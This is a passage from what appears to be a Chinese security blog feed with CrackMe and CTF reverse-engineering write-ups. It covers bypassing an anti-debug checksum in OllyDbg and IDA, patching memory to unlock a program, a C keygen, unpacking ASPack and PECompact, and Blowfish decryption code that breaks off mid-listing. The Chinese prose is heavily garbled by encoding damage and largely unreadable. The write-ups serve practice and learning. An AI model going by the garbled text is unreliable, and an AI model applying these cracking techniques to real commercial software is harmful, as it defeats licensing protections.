src="/2020/07/31/CrackMe/image-20200806182822916.png" alt="image-20200806182822916"></p><p>ODè°ƒè¯•åï¼Œåœ¨IDAä¸­çœ‹æŒ‡å®šä»£ç æ®µï¼šå¯ä»¥çœ‹åˆ°dword_402313å¤„çš„å€¼å†³å®šäº†æ§ä»¶çš„æ˜¾ç¤ºå†…å®¹å’Œæ ·å¼ã€‚<img src="/2020/07/31/CrackMe/image-20200806183539623.png" alt="image-20200806183539623"></p><p>æ‰¾åˆ°dword_402313èµ‹å€¼å¤„ï¼šæ˜¯å¯¹ç¨‹åºéƒ¨åˆ†çš„ä»£ç çš„æ ¡éªŒï¼Œæ£€æµ‹æ˜¯å¦ä¸‹æ–­ç‚¹ã€‚<img src="/2020/07/31/CrackMe/image-20200806183725134.png" alt="image-20200806183725134"></p><p>è™½ç„¶çŸ¥é“äº†dowrd_402313å¤„çš„å€¼å½±å“å¯¹è¯æ¡†çš„æ˜¾ç¤ºï¼Œä½†æ˜¯ä»€ä¹ˆæ ·çš„å€¼æ‰èƒ½è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„å‘¢ï¼Œå›åˆ°ODåŠ¨è°ƒã€‚<img src="/2020/07/31/CrackMe/image-20200806185407720.png" alt="image-20200806185407720"></p><p>ç”±äºç¨‹åºä¸­å­˜åœ¨ä»£ç æ ¡éªŒï¼Œå¤šæ¬¡è°ƒè¯•å‘ç°ï¼Œå½“ä¸‹æ–­å[402313] = 1ï¼Œä¸ºä¸‹æ–­ç‚¹[402313] = 0ã€‚ ç»§ç»­è°ƒè¯•ï¼š<img src="/2020/07/31/CrackMe/image-20200806185813389.png" alt="image-20200806185813389"></p><p>åˆ°è¿™é‡Œå°±æ¸…æ¥šäº†ï¼Œ[402313]çš„å€¼è¿˜å†³å®šäº†æ˜¾ç¤ºå­—ç¬¦ä¸²çš„åç§»ä½ç½®ï¼Œå½“[402313] = 1æ—¶ï¼Œå­—ç¬¦ä¸²ä¸ºï¼šDAMNâ€™s TryMe -CRACKED! è€Œå®ƒåé¢ä¸€ä¸ªå­—ç¬¦ä¸²å°±æ˜¯ï¼šUNLOCKEDï¼æ‰€ä»¥æ¨å‡ºï¼š[402313]çš„å€¼è¦ç­‰äº2ã€‚</p><p>é‡æ–°è½½å…¥ï¼Œæ‰¾åˆ°åˆé€‚ä½ç½®åœ¨å†…å­˜çª—å£ä¿®æ”¹[402313]çš„å€¼ä¸º2ï¼Œç„¶åè¿è¡Œã€‚<img src="/2020/07/31/CrackMe/image-20200806190419665.png" alt="image-20200806190419665"></p><p>å¯¹è¯æ¡†å¼¹å‡ºçš„å†…å®¹ä»ç„¶ä¸æ˜¯UNLOCKEDï¼idaä¸­ODéƒ½å¯ä»¥æ‰¾åˆ°MessageBoxAçœ‹ä¸€ä¸‹ã€‚è¿™é‡Œä½¿ç”¨ODï¼š<img src="/2020/07/31/CrackMe/image-20200806190848568.png" alt="image-20200806190848568"></p><p>ä»ä¸Šé¢çœ‹åˆ°ï¼Œ[402308]çš„å€¼ä¼šå†³å®šå¯¹ä¸å¯¹[402313]çš„å€¼ä¿®æ”¹ï¼Œæ‰€ä»¥å¯¹[402308]çš„å€¼ä¿®æ”¹ï¼šæˆåŠŸã€‚æœ€åè¦è®©ç¨‹åºä¹‹åä¹Ÿå¯ä»¥è¿™æ ·è¿è¡Œï¼Œç®€å•çš„patchä¸€ä¸‹å³å¯ã€‚</p><p>ä¸‹é¢å¼€å§‹æ‰¾æ³¨å†Œç®—æ³•ï¼Œç–‘æƒ‘çš„æ˜¯RegisteræŒ‰é’®ä¸ºä»€ä¹ˆä¸èƒ½ç‚¹å‡»ï¼Ÿéš¾é“è¿˜è¦å¯¹ç¨‹åºæ‰“è¡¥ä¸ä»€ä¹ˆçš„ï¼Œä¸ç†Ÿæ‚‰Win32ç¼–ç¨‹è„‘å­è¿˜æ˜¯ä¸€ç‰‡ç©ºç™½ã€‚</p><p>ä½†æ˜¯æœºç¼˜å·§åˆä¸‹ï¼Œè®©æˆ‘æ‰¾åˆ°äº†è¿™é‡Œé¢çš„ç„æœºã€‚åœ¨ODä¸­æ‰¾åˆ°è·å–æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„å‡½æ•°åï¼Œæ¡ä»¶åå°„ä¸‹äº†æ–­ã€‚éšä¾¿ç‚¹å‡»äº†ä¸‹ç¨‹åºçš„è¾“å…¥æ–‡æœ¬æ¡†ï¼Œç¨‹åºçªç„¶åœ¨ODä¸­æ–­äº†ä¸‹æ¥ã€‚ã€‚ä¸”çœ‹åˆ°ä¸‹é¢çš„ä¸€ä¸ª<strong>EnableWindow</strong>å‡½æ•°ï¼Œç™¾åº¦ä¸‹åŠŸèƒ½ï¼šè®¾ç½®çª—å£çš„å¯ç”¨æ€§ï¼Œå³æˆ‘ä»¬ç¨‹åºçš„ResiteræŒ‰é’®æ˜¯å¦å¯ç”¨ã€‚<img src="/2020/07/31/CrackMe/image-20200806193140672.png" alt="image-20200806193140672"></p><p>å¤šæ¬¡æµ‹è¯•ï¼Œå‘ç°ç¬¬ä¸€ä¸ªGetDlgItemTextAæ˜¯è·å–nameå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªè·å–keyã€‚ä¸”æ¯è¾“å…¥ä¸€ä¸ªnameå­—ç¬¦å°±è°ƒç”¨ä¸€æ¬¡ç¬¬ä¸€ä¸ªGetDlgItemTextAå‡½æ•°å°†è¯¥å­—ç¬¦å­˜å…¥æŒ‡å®šçš„å†…å­˜åŒºåŸŸï¼Œè¿”å›å­—ç¬¦é•¿åº¦ï¼›æ¯è¾“å…¥ä¸€ä¸ªkeyå°±è°ƒç”¨ç¬¬äºŒä¸ªGetDlgItemTextAå‡½æ•°å°†å…¶å­˜å…¥æŒ‡å®šå†…å­˜åŒºåŸŸï¼Œè¿”å›å­—ç¬¦é•¿åº¦ï¼Œå¹¶è°ƒç”¨<strong>004012F3</strong>å‡½æ•°ï¼ˆåº”è¯¥æ˜¯nameä¸keyçš„éªŒè¯è¿‡ç¨‹ï¼‰ï¼Œæœ€åé€šè¿‡<strong>004012F3</strong>å‡½æ•°çš„è¿”å›å€¼æ¥æ‰§è¡Œ<strong>EnableWindow</strong>å‡½æ•°ï¼Œä»¥æ­¤å†³å®š<strong>Register</strong>æŒ‰é’®çš„æŒ‰é’®æ˜¯å¦å¯ç”¨ã€‚</p><p>è¾“å…¥æ•°æ®ï¼Œä¸‹æ–­004012F3å¹¶è¿›å…¥ï¼š<img src="/2020/07/31/CrackMe/image-20200806233948875.png" alt="image-20200806233948875"></p><p>åˆ°æ­¤ï¼Œç»“æŸå¯¹ç¨‹åºçš„åˆ†æã€‚æœ€åå°†æ¯ä¸ªåå…­è¿›åˆ¶æ•°è½¬åŒ–ä¸ºå¯¹åº”çš„å­—ç¬¦çš„æ±‡ç¼–æŒ‡ä»¤è¿˜è¦å¤šçœ‹çœ‹ï¼š<code>sbb al, 69ï¼›dasï¼›</code>ã€‚è¿™é‡Œal = 0xEï¼Œsbbå¸¦å€Ÿä½å‡æ³•åï¼šal = al-0x69-CF = 0xAEã€‚</p><blockquote><p>dasï¼šç»„åˆ(å‹ç¼©)BCDç çš„åŠ æ³•è°ƒæ•´æŒ‡ä»¤ã€‚<strong>åŠŸèƒ½ï¼šå¦‚æœALä½å››ä½&gt;9æˆ–AF=1 ï¼Œåˆ™ALçš„å€¼å‡06hï¼Œå¹¶ç½®AF=1ï¼›å¦‚æœALé«˜å››ä½&gt;9æˆ–CF=1 ï¼Œåˆ™ALçš„å€¼å‡60h ,ä¸”ç½®CF=1ï¼›</strong></p></blockquote><p>æ‰€ä»¥è¿™é‡Œï¼šal = al-0x60 = 0x45ã€‚<strong>è€Œ0x45å°±æ˜¯â€™Eâ€™å­—ç¬¦çš„ASCIIã€‚</strong></p><p>æœ€åCè¯­è¨€ç®€å•å†™ä¸ªæ³¨å†Œæœºç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0x44414D4E</span>, i = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"nameï¼š"</span>);</span><br><span class="line">gets(name);</span><br><span class="line"><span class="keyword">while</span>(name[i])</span><br><span class="line">&#123;</span><br><span class="line">temp += name[i];</span><br><span class="line">ans = ((ans &gt;&gt; <span class="number">1</span>) | ((ans&amp;<span class="number">1</span>) &lt;&lt; <span class="number">31</span>));</span><br><span class="line">ans = ((ans &gt;&gt; i) | ((ans&amp;((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>, i)<span class="number">-1</span>))) &lt;&lt; <span class="number">32</span>-i));</span><br><span class="line">ans ^= temp;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">ans |= <span class="number">0x10101010</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è·ƒè·ƒæ¬²è¯•"><a href="#è·ƒè·ƒæ¬²è¯•" class="headerlink" title="è·ƒè·ƒæ¬²è¯•"></a>è·ƒè·ƒæ¬²è¯•</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>é¢˜ç›®åŠ äº†Aspackå£³ï¼Œç›´æ¥ODä¸­å †æ ˆå¹³è¡¡åŸç†è„±å£³ã€‚</p><p>æ‰¾åˆ°è·å–ç”¨æˆ·è¾“å…¥ä¿¡æ¯çš„APIï¼Œæ¥åˆ°éªŒè¯è¿‡ç¨‹ï¼šé¦–å…ˆæ˜¯ä¸‹æ–­ç‚¹çš„4ä¸ªå‡½æ•°å¯¹email_addresséªŒè¯ã€‚<img src="/2020/07/31/CrackMe/image-20200810111355447.png" alt="image-20200810111355447"></p><p>åŠ¨æ€å¾ˆå¤šæ¬¡ï¼Œå§‹ç»ˆæ²¡è°ƒå‡ºè¿™å‡ ä¸ªå‡½æ•°çš„åŠŸèƒ½ä¸”ä»£ç é€»è¾‘ä¹Ÿå¥‡æ€ªã€‚ã€‚ã€‚</p><p>é¢˜ç›®çš„è¦æ±‚åªè¦åé¢serialï¼Œæˆ–è®¸serialä¸email_addressä¸serialæ²¡æœ‰å…³ç³»ï¼Œå¹²è„†ç›´æ¥è·³è¿‡email_addreeè®¾ç½®æ–°çš„EIPï¼Œæ¥åˆ°éªŒè¯serialå¤„ï¼š<img src="/2020/07/31/CrackMe/image-20200810111950081.png" alt="image-20200810111950081"></p><p>æœç„¶ï¼Œserialä¸email_addressæ²¡æœ‰å…³ç³»ï¼Œserialçš„éªŒè¯ä¹Ÿåªæ˜¯ç®€å•çš„åŠ å‡æ³•ã€‚å°±æ˜¯æ•´ç†èµ·æ¥æœ‰ç‚¹éº»çƒ¦ã€‚</p><p>æœ€åè½½å…¥IDAçœ‹çœ‹ä¼ªä»£ç å‘¢ã€‚åŸæ¥æ˜¯Cæ ‡å‡†åº“é‡ŒæŸ¥æ‰¾å­å­—ç¬¦ä¸²çš„å‡½æ•°ã€‚<img src="/2020/07/31/CrackMe/image-20200810112350707.png" alt="image-20200810112350707"></p><h2 id="ä¸€çŸ¥åŠè§£"><a href="#ä¸€çŸ¥åŠè§£" class="headerlink" title="ä¸€çŸ¥åŠè§£"></a>ä¸€çŸ¥åŠè§£</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>ä»è¿™ä¸ªCMè®¤è¯†äº†ä¸€ä¸ªæ–°å£³ï¼šPEcompact</p><p>è½½å…¥ODä»ç„¶ä½¿ç”¨å †æ ˆå¹³è¡¡åŸç†è„±å£³ï¼Œä½†å¯¹è¿™ä¸ªå£³å¥½åƒä¸é€‚ç”¨ã€‚ã€‚ã€‚è®¤ä¸ºè‡ªå·±æ‰¾åˆ°äº†OEPï¼Œdumpåå‘ç°æ‰“ä¸å¼€ã€‚</p><p>æ¥åˆ°çœ‹é›ªè®ºå›æ‰¾å¸ˆå‚…ä»¬è„±è¿™ä¸ªå£³çš„æ–¹æ³•ï¼Œå…ˆæ˜¯ä½¿ç”¨äº†<a href="https://bbs.pediy.com/user-24467.htm" target="_blank" rel="noopener">CCDebuger</a>å¤§å¸ˆå‚…çš„è„±å£³è„šæœ¬ï¼ŒçœŸçš„æ˜¯å¼ºï¼Œç®—æ˜¯è„±å£³æœºäº†ã€‚è„±å£³åå‘ç°å’Œæˆ‘æ‰¾åˆ°çš„OEPæ˜¯ä¸€æ ·ï¼Œé‚£æˆ‘çš„åº”è¯¥æ˜¯æ²¡æœ‰ä¿®å¤è¾“å…¥è¡¨å¯¼è‡´æ‰“ä¸å¼€ã€‚</p><p>åé¢åˆçœ‹åˆ°äº†ä¸€ä½å¸ˆå‚…è„±è¿™ä¸ªå£³çš„å¸–å­ï¼Œé‡Œé¢è¿™æ ·è¯´é“ï¼š</p><blockquote><p><strong>å¤–å£³å®Œæ•´åœ°ä¿ç•™äº†è¾“å…¥è¡¨ï¼Œå¤–å£³åŠ è½½æ—¶æ²¡æœ‰å¯¹IATåŠ å¯†ï¼›å¤–å£³è§£å‹æ•°æ®æ—¶ï¼Œå®Œæ•´çš„è¾“å…¥è¡¨ä¼šåœ¨å†…å­˜ä¸­å‡ºç°ï¼Œç„¶åå¤–å£³ç”¨æ˜¾ç¤ºåŠ è½½DLLçš„æ–¹å¼è·å¾—å„ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶å°†è¯¥åœ°å€å¡«å……åˆ°IATä¸­ã€‚</strong></p></blockquote><p>æ‰€ä»¥æˆ‘å›åˆ°ODæ¢äº†ç¬¬äºŒä¸ªdumpçš„æ–¹å¼ï¼š<img src="/2020/07/31/CrackMe/image-20200811111903851.png" alt="image-20200811111903851"></p><p>å“ˆå“ˆï¼Œè¿˜æ²¡æœ‰ç”¨importRecå°±èƒ½æˆåŠŸæ‰“å¼€ï¼Œåªä¸è¿‡è¿™ä¸ªä¹Ÿçœ‹æƒ…å†µã€‚</p><p>å¦å¤–è®°å½•ä¸€ä¸‹ç”¨espå®šå¾‹è„±è¿™ä¸ªå£³ä¸ä¸€æ ·çš„åœ°æ–¹ï¼šé¦–å…ˆä¸‹ç¡¬ä»¶è®¿é—®æ–­ç‚¹ã€‚<img src="/2020/07/31/CrackMe/image-20200811112234416.png" alt="image-20200811112234416"></p><p>F9åï¼Œæ–­åœ¨ç¨‹åºçš„é¢†ç©ºï¼šå¯ä»¥çœ‹åˆ°å¹¶ä¸æ˜¯ä»å †æ ˆpopå‡ºä¸‹æ–­çš„æ•°æ®æ–­ä¸‹çš„ï¼Œæ‰€ä»¥ç»§ç»­F9ã€‚<img src="/2020/07/31/CrackMe/image-20200811112818716.png" alt="image-20200811112818716"></p><p>åé¢é‡åˆ°åŒä¸Šå¤„ç†ï¼Œç›´åˆ°çœ‹åˆ°å¯¹å †æ ˆè®¿é—®ã€‚ä¸ä¹…çœ‹åˆ°æ¥åˆ°OEPæ ‡å¿—ã€‚<img src="/2020/07/31/CrackMe/image-20200811113028787.png" alt="image-20200811113028787"></p><p>æœ€åï¼Œç¨‹åºçš„é€†å‘å¾ˆç®€å•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CrackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç ´è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ‚åˆwriteup</title>
      <link href="/2020/07/29/%E6%9D%82%E5%90%88writeup/"/>
      <url>/2020/07/29/%E6%9D%82%E5%90%88writeup/</url>
      
        <content type="html"><![CDATA[<p>å¹³æ—¶ä¸€äº›é›¶æ•£çš„CTFé¢˜çš„è®°å½•ã€‚<a id="more"></a></p><h2 id="little-fish-re"><a href="#little-fish-re" class="headerlink" title="little fish (re)"></a>little fish (re)</h2><blockquote><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1Wpl5KjFQf33hgQpE29YuKQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Wpl5KjFQf33hgQpE29YuKQ</a><br>æå–ç ï¼šslh8<br>å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p></blockquote><p>ç¨‹åºæ‰“ä¸å¼€ï¼Œæç¤ºç¼ºå°‘libstdc++-6.dllï¼Œåšå®ŒgoogleåŠå¤©æ‰¾è¿™ä¸ªåº“ä¸‹è½½ï¼Œä½†éƒ½æ˜¯32ä½çš„ã€‚ã€‚æƒ³éªŒè¯flagéƒ½ä¸è¡Œã€‚ã€‚</p><p>idaä¸­mainå‡½æ•°ä¼ªä»£ç ï¼Œå¾ˆç®€å•ï¼š<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817163536555.png" alt="image-20200817163536555"></p><p>åŠ å¯†å‡½æ•°æ•´ä½“ï¼šé‡Œé¢è¿˜æ¶‰åŠ2ä¸ªè¡¨ï¼Œä¸”åŠ å¯†æœ‰ç‚¹ç»•ã€‚æ„Ÿè§‰æ˜¯ä»€ä¹ˆåŠ å¯†ã€‚ã€‚ä½†ä¸æ¸…æ¥šã€‚ã€‚<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817164301185.png" alt="image-20200817164301185"></p><p>ä¹‹åä»ç™¾åº¦äº†å…¶ä¸­çš„ä¸€ä¸ªè¡¨ä¸­éƒ¨åˆ†æ•°æ®ï¼Œä»ä¸€ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°åŠ å¯†ç®—æ³•ï¼š</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817164720071.png" alt="image-20200817164720071"></p><p>å…¶å®é¢˜ç›®æ–‡ä»¶æœ‰æç¤ºï¼Œä½†å¯¹äºä¸çŸ¥é“è¿™ä¸ªåŠ å¯†ç®—æ³•æ¥è¯´å°±æ˜¯æ²¡æœ‰æç¤ºã€‚ã€‚ã€‚</p><p>ç„¶åæ‰¾blowfishåŠ å¯†ç®—æ³•æ–‡ç« å­¦ä¹ ã€‚<a href="https://www.cnblogs.com/my_life/articles/5845940.html" target="_blank" rel="noopener">è®²çš„å¥½æ¸…æ¥š</a></p><p>å†æ¬¡å›åˆ°idaä¸­çœ‹é¢˜ç›®ä¸­çš„åŠ å¯†ç®—æ³•ï¼Œå¯¹æ¯”ä¸‹ï¼Œè¿™æ¬¡å½“ç„¶æ˜¯æ¸…æ¥šå¥½å¤šï¼Œä¹Ÿç¡®å®šäº†å°±æ˜¯æ­£å¸¸çš„blowfishåŠ å¯†ã€‚</p><p>å…ˆæ˜¯å†™æ‰¾åˆ°ç½‘ä¸Šçš„blowfishåŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨Cè¯­è¨€å†™æ¥æ¨¡æ‹Ÿäº†ä¸‹ï¼Œç„¶åè§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> P[<span class="number">16</span> + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> S[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125; BLOWFISH_CTX;</span><br><span class="line"></span><br><span class="line">BLOWFISH_CTX ctx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ORIG_P[] = &#123; åŸå§‹çš„Pç›’æ•°æ® &#125;;<span class="comment">//ä½¿ç”¨PIæ¥å¡«å……çš„</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ORIG_S[] = &#123; åŸå§‹çš„Sç›’æ•°æ®ï¼Œå¤ªå¤šè¿™é‡Œçœç•¥ &#125;;<span class="comment">//ä½¿ç”¨PIæ¥å¡«å……çš„</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">F</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> a, b, c, d;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  y;</span><br><span class="line"></span><br><span class="line">    d = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    c = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    b = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    a = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    y = ctx-&gt;S[<span class="number">0</span>][a] + ctx-&gt;S[<span class="number">1</span>][b];</span><br><span class="line">    y = y ^ ctx-&gt;S[<span class="number">2</span>][c];</span><br><span class="line">    y = y + ctx-&gt;S[<span class="number">3</span>][d];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Encrypt</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xl, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  temp;</span><br><span class="line">    <span class="keyword">short</span> i;</span><br><span class="line"></span><br><span class="line">    Xl = *xl;</span><br><span class="line">    Xr = *xr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        Xl = Xl ^ ctx-&gt;P[i];</span><br><span class="line">        Xr = F(ctx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ ctx-&gt;P[N];</span><br><span class="line">    Xl = Xl ^ ctx-&gt;P[N + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    *xl = Xl;</span><br><span class="line">    *xr = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Decrypt</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xl, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  temp;</span><br><span class="line">    <span class="keyword">short</span>       i;</span><br><span class="line"></span><br><span class="line">    Xl = *xl;</span><br><span class="line">    Xr = *xr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = N + <span class="number">1</span>; i &gt; <span class="number">1</span>; --i) &#123;</span><br><span class="line">        Xl = Xl ^ ctx-&gt;P[i];</span><br><span class="line">        Xr = F(ctx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exchange Xl and Xr */</span></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exchange Xl and Xr */</span></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ ctx-&gt;P[<span class="number">1</span>];</span><br><span class="line">    Xl = Xl ^ ctx-&gt;P[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    *xl = Xl;</span><br><span class="line">    *xr = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 